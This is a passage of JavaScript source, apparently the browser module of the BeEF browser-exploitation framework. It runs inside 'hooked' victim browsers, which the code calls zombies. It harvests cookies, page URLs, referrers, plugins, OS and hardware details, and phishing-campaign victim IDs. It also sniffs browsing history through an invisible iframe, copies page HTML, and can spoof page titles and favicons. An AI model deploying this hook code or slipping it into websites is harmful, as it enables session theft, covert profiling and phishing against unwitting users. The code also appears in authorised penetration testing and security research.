        } else if (document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight )) {
            // IE 6+ in 'standards compliant mode'
            myWidth = document.documentElement.clientWidth;
            myHeight = document.documentElement.clientHeight;
        } else if (document.body && ( document.body.clientWidth || document.body.clientHeight )) {
            // IE 4 compatible
            myWidth = document.body.clientWidth;
            myHeight = document.body.clientHeight;
        }
        return {
            width: myWidth,
            height: myHeight
        }
    },

    /**
     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
     */
    getDetails: function () {
        var details = new Array();

        var browser_name = beef.browser.getBrowserName();
        var browser_version = beef.browser.getBrowserVersion();
        var browser_reported_name = beef.browser.getBrowserReportedName();
        var browser_language = beef.browser.getBrowserLanguage();
        var page_title = (document.title) ? document.title : "Unknown";
        var page_uri = (document.location.href) ? document.location.href : "Unknown";
        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
        var hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
        switch (document.location.protocol) {
            case "http:":
                var default_port = "80";
                break;
            case "https:":
                var default_port = "443";
                break
            default:
                var default_port = "";
        }
        var hostport = (document.location.port) ? document.location.port : default_port;
        var browser_plugins = beef.browser.getPlugins();
        var date_stamp = new Date().toString();
        var os_name = beef.os.getName();
        var os_version = beef.os.getVersion();
        var default_browser = beef.os.getDefaultBrowser();
        var hw_name = beef.hardware.getName();
        var cpu_type = beef.hardware.cpuType();
        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
        var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : 'Unknown';
        var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {
            if (value == true) return value; else if (value == null) return; else if (typeof value == 'object') return value; else return;
        });
        var screen_size = beef.browser.getScreenSize();
        var window_size = beef.browser.getWindowSize();
        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
        var has_web_worker = (beef.browser.hasWebWorker()) ? "Yes" : "No";
        var has_web_gl = (beef.browser.hasWebGL()) ? "Yes" : "No";
        var has_webrtc = (beef.browser.hasWebRTC()) ? "Yes" : "No";
        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
        var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
        try {
            var cookies = document.cookie;
            /* Never stop the madness dear C.
             * var veglol = beef.browser.cookie.veganLol();
             */
            if (cookies) details['Cookies'] = cookies;
        } catch (e) {
            details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
        }

        if (browser_name) details['BrowserName'] = browser_name;
        if (browser_version) details['BrowserVersion'] = browser_version;
        if (browser_reported_name) details['BrowserReportedName'] = browser_reported_name;
        if (browser_language) details['BrowserLanguage'] = browser_language;
        if (page_title) details['PageTitle'] = page_title;
        if (page_uri) details['PageURI'] = page_uri;
        if (page_referrer) details['PageReferrer'] = page_referrer;
        if (hostname) details['HostName'] = hostname;
        if (hostport) details['HostPort'] = hostport;
        if (browser_plugins) details['BrowserPlugins'] = browser_plugins;
        if (os_name) details['OsName'] = os_name;
        if (os_version) details['OsVersion'] = os_version;
        if (default_browser) details['DefaultBrowser'] = default_browser;
        if (hw_name) details['Hardware'] = hw_name;
        if (cpu_type) details['CPU'] = cpu_type;
        if (touch_enabled) details['TouchEnabled'] = touch_enabled;
        if (date_stamp) details['DateStamp'] = date_stamp;
        if (browser_platform) details['BrowserPlatform'] = browser_platform;
        if (browser_type) details['BrowserType'] = browser_type;
        if (screen_size) details['ScreenSize'] = screen_size;
        if (window_size) details['WindowSize'] = window_size;
        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled;
        if (has_flash) details['HasFlash'] = has_flash;
        if (has_phonegap) details['HasPhonegap'] = has_phonegap;
        if (has_web_socket) details['HasWebSocket'] = has_web_socket;
        if (has_web_worker) details['HasWebWorker'] = has_web_worker;
        if (has_web_gl) details['HasWebGL'] = has_web_gl;
        if (has_googlegears) details['HasGoogleGears'] = has_googlegears;
        if (has_webrtc) details['HasWebRTC'] = has_webrtc;
        if (has_activex) details['HasActiveX'] = has_activex;
        if (has_quicktime) details['HasQuickTime'] = has_quicktime;
        if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
        if (has_wmp) details['HasWMP'] = has_wmp;

        var pf_integration = "<%= @phishing_frenzy_enable %>";
        if (pf_integration) {
            var pf_param = "uid";
            var pf_victim_uid = "";
            var location_search = window.location.search.substring(1);
            var params = location_search.split('&');
            for (var i = 0; i < params.length; i++) {
                var param_entry = params[i].split('=');
                if (param_entry[0] == pf_param) {
                    pf_victim_uid = param_entry[1];
                    details['PhishingFrenzyUID'] = pf_victim_uid;
                    break;
                }
            }
        } else {
            details['PhishingFrenzyUID'] = "N/A";
        }

        return details;
    },

    /**
     * Returns boolean value depending on whether the browser supports ActiveX
     */
    hasActiveX: function () {
        return !!window.ActiveXObject;
    },

    /**
     * Returns boolean value depending on whether the browser supports WebRTC
     */
    hasWebRTC: function () {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    /**
     * Returns boolean value depending on whether the browser supports Silverlight
     */
    hasSilverlight: function () {
        var result = false;

        try {
            if (beef.browser.isIE()) {
                var slControl = new ActiveXObject('AgControl.AgControl');
                result = true;
            } else if (navigator.plugins["Silverlight Plug-In"]) {
                result = true;
            }
        } catch (e) {
            result = false;
        }

        return result;
    },

    /**
     * Returns array of results, whether or not the target zombie has visited the specified URL
     */
    hasVisited: function (urls) {
        var results = new Array();
        var iframe = beef.dom.createInvisibleIframe();
        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        ifdoc.open();
        ifdoc.write('<style>a:visited{width:0px !important;}</style>');
        ifdoc.close();
        urls = urls.split("\n");
        var count = 0;
        for (var i in urls) {
            var u = urls[i];
            if (u != "" || u != null) {
                var success = false;
                var a = ifdoc.createElement('a');
                a.href = u;
                ifdoc.body.appendChild(a);
                var width = null;
                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
                if (width == '0px') {
                    success = true;
                }
                results.push({'url': u, 'visited': success});
                count++;
            }
        }
        beef.dom.removeElement(iframe);
        if (results.length == 0) {
            return false;
        }
        return results;
    },

    /**
     * Checks if the zombie has Web Sockets enabled.
     * @return: {Boolean} true or false.
     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
     * */
    hasWebSocket: function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },

    /**
     * Checks if the zombie has Web Workers enabled.
     * @return: {Boolean} true or false.
     * */
    hasWebWorker: function () {
        return (typeof(Worker) !== "undefined");
    },

    /**
     * Checks if the zombie has WebGL enabled.
     * @return: {Boolean} true or false.
     *
     * @from: https://github.com/idofilin/webgl-by-example/blob/master/detect-webgl/detect-webgl.js
     * */
    hasWebGL: function () {
      try {
        var canvas = document.createElement("canvas");
        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        return !!(gl && gl instanceof WebGLRenderingContext);
      } catch(e) {
        return false;
      }
    },

    /**
     * Checks if the zombie has Google Gears installed.
     * @return: {Boolean} true or false.
     *
     * @from: https://code.google.com/apis/gears/gears_init.js
     * */
    hasGoogleGears: function () {

        var ggfactory = null;

        // Chrome
        if (window.google && google.gears) return true;

        // Firefox
        if (typeof GearsFactory != 'undefined') {
            ggfactory = new GearsFactory();
        } else {
            // IE
            try {
                ggfactory = new ActiveXObject('Gears.Factory');
                // IE Mobile on WinCE.
                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
                    ggfactory.privateSetGlobalObject(this);
                }
            } catch (e) {
                // Safari
                if ((typeof navigator.mimeTypes != 'undefined')
                    && navigator.mimeTypes["application/x-googlegears"]) {
                    ggfactory = document.createElement("object");
                    ggfactory.style.display = "none";
                    ggfactory.width = 0;
                    ggfactory.height = 0;
                    ggfactory.type = "application/x-googlegears";
                    document.documentElement.appendChild(ggfactory);
                    if (ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
                }
            }
        }
        if (!ggfactory) return false; else return true;
    },

    /**
     * Checks if the zombie has Foxit PDF reader plugin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFoxit()) { ... }
     * */
    hasFoxit: function () {

        var foxitplugin = false;

        try {
            if (beef.browser.isIE()) {
                var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
                foxitplugin = true;
            } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
                foxitplugin = true;
            }
        } catch (e) {
            foxitplugin = false;
        }

        return foxitplugin;
    },

    /**
     * Returns the page head HTML
     **/
    getPageHead: function () {
        var html_head;
        try {
            html_head = document.head.innerHTML.toString();
        } catch (e) {
        }
        return html_head;
    },

    /**
     * Returns the page body HTML
     **/
    getPageBody: function () {
        var html_body;
        try {
            html_body = document.body.innerHTML.toString();
        } catch (e) {
        }
        return html_body;
    },

    /**
     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
     **/
    changeFavicon: function (favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link'),
            oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink) document.head.removeChild(oldLink);
        document.head.appendChild(link);
        if (this.isC()) iframe.src += '';
    },

    /**
     * Changes page title
     **/
    changePageTitle: function (title) {
        document.title = title;
    },

    /**
     * Get the browser language
     */
    getBrowserLanguage: function () {
        var l = 'Unknown';
        try {
            l = window.navigator.userLanguage || window.navigator.language;
        } catch (e) {
        }
        return l;
    },

    /**
     *  A function that gets the max number of simultaneous connections the
     *  browser can make per origin, or globally on all origin.
     *
     *  This code is based on research from browserspy.dk
     *
     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
     * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
     *    the number of connections to the callback function as "this"
     *
     *    example usage:
     *        $j.when(getMaxConnections()).done(function(){
     *            console.debug("Max Connections: " + this);
     *            });
     *
     */
    getMaxConnections: function (scope) {

        var imagesCount = 30;		// Max number of images to test
        var secondsTimeout = 5;		// Image load timeout threashold
        var testUrl = "";		// The image testing service URL

        // User broserspy.dk max connections service URL.
        if (scope == 'PER_DOMAIN')
            testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
        else
        // The token will be replaced by a different number with each request (different origin).
            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";

        var imagesLoaded = 0;			// Number of responding images before timeout.
        var imagesRequested = 0;		// Number of requested images.
        var testImages = new Array();		// Array of all images.
        var deferredObject = $j.Deferred();	// A jquery Deferred object.

        for (var i = 1; i <= imagesCount; i++) {
            // Asynchronously request image.
            testImages[i] =
                $j.ajax({
                    type: "get",
                    dataType: true,
                    url: (testUrl.replace("<token>", i)) + Math.random(),
                    data: "",
                    timeout: (secondsTimeout * 1000),

                    // Function on completion of request.
                    complete: function (jqXHR, textStatus) {

                        imagesRequested++;

                        // If the image returns a 200 or a 302, the text Status is "error", else null
                        if (textStatus == "error") {
                            imagesLoaded++;
                        }

                        // If all images requested
                        if (imagesRequested >= imagesCount) {
                            // resolve the deferred object passing the number of loaded images.
                            deferredObject.resolveWith(imagesLoaded);
                        }
                    }
                });

        }

        // Return a promise to resolve the deffered object when the images are loaded.
        return deferredObject.promise();

    }

};

beef.regCmp('beef.browser');
